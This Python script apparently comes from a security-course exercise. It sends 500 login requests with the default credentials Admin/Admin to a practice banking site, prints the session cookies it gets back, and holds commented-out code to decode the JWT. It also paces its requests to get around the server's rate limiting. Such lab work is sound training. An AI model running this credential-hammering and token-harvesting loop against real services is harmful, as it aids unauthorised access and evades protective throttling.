import requests
import re
import base64
import time


sleep = 0
count_200 = 0
for i in range(500):
    cert = ('/home/fafnir/cert/6843.pem', '/home/fafnir/cert/6843.key')
    burp0_url = "https://files.quoccabank.com:443/login"
    burp0_headers = {"Sec-Ch-Ua": "\" Not;A Brand\";v=\"99\", \"Google Chrome\";v=\"91\", \"Chromium\";v=\"91\"", "Sec-Ch-Ua-Mobile": "?0", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36", "Content-Type": "application/json", "Accept": "*/*", "Origin": "https://files.quoccabank.com", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://files.quoccabank.com/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8", "Connection": "close"}
    burp0_json={"password": "Admin", "username": "Admin"}
    response = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, cert=cert)

    setcookie = response.headers['Set-Cookie']
    date = response.headers['Date']

    print(setcookie, date)
    #need = list(setcookie.split('.'))[1]
    #for i in range(4-len(need)%4):
    #    need += '='

    #need i.e. the jwt selection
    #is padded
    #base64_bytes = need.encode('ascii')
    #message_bytes = base64.b64decode(base64_bytes)
    #print(message_bytes)
    #message = message_bytes.decode('ascii')
    #print(message)
    


    #time.sleep(0.25)    #logic for rate limiting
    if(response.status_code == 200):
        if(count_200 > 30):
            print('resetting throttle')
            #returning sleep = 0
            #returning count = 0
            sleep = 0
            count_200 = 0
    
    #enhance ur clam
    if(response.status_code == 420):
        time.sleep(sleep+0.5)
        print(f'throttling for {sleep+0.5}s')
        sleep+=0.25

    time.sleep(sleep)
